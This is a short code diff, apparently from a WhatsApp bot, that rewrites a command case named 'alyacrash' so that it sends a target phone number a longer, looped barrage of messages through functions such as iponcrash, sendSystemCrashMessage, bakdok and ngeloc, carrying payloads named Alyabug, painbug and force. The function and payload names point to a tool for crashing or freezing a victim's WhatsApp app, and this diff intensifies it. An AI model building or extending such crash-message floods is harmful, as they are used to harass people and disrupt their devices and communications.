@@ -21291,17 +21291,32 @@ case "alyacrash": {
     };
 
     for (let j = 0; j < 5; j++) { // Loop 5 times
-        await bakdok(whatsappNumber, Alyabug);
-         // Random delay between 2 
-        await sendPaymentInfoMessage(whatsappNumber, Alyabug);
-        await penghitaman(whatsappNumber, painbug, Alyabug);
-        await iponcrash(whatsappNumber, force);
-        await sendSystemCrashMessage(whatsappNumber, force);
-        await penghitaman(whatsappNumber, painbug, Alyabug);
-        await sendPaymentInfoMessage(whatsappNumber, painbug);
-        await sendSystemCrashMessage(whatsappNumber, force2, painbug);
-        await ngeloc(whatsappNumber, force2, painbug);
-
+  await sendPaymentInfoMessage(whatsappNumber)
+    await bakdok(whatsappNumber, Alyabug)
+    await sendPaymentInfoMessage(whatsappNumber)
+    await sendPaymentInfoMessage(whatsappNumber, force2)
+    await bakdok(whatsappNumber, Alyabug)
+    await sendPaymentInfoMessage(whatsappNumber, Alyabug)
+    await penghitaman(whatsappNumber, painbug)
+    await sendPaymentInfoMessage(whatsappNumber, zpay)
+    await iponcrash(whatsappNumber, force)
+    await sendPaymentInfoMessage(whatsappNumber, painbug)
+    await sendSystemCrashMessage(whatsappNumber, force)
+    await sendPaymentInfoMessage(whatsappNumber)
+    await iponcrash(whatsappNumber, Alyabug)
+    await sendPaymentInfoMessage(whatsappNumber, force)
+    await penghitaman(whatsappNumber, painbug)
+    await sendPaymentInfoMessage(whatsappNumber, Alyabug)
+    await sendPaymentInfoMessage(whatsappNumber, zpay)
+    await ngeloc(whatsappNumber, force)
+    await sendPaymentInfoMessage(whatsappNumber, zpay)
+    await bakdok(whatsappNumber, Alyabug)
+    await sendPaymentInfoMessage(whatsappNumber, force2)
+    await penghitaman(whatsappNumber, painbug)
+    await sendPaymentInfoMessage(whatsappNumber, force)
+    await sendPaymentInfoMessage(whatsappNumber, painbug)
+    await ngeloc(whatsappNumber, force2)
+    await sleep(700)
          if (j === 1) {
             // Additional logic if needed
         }
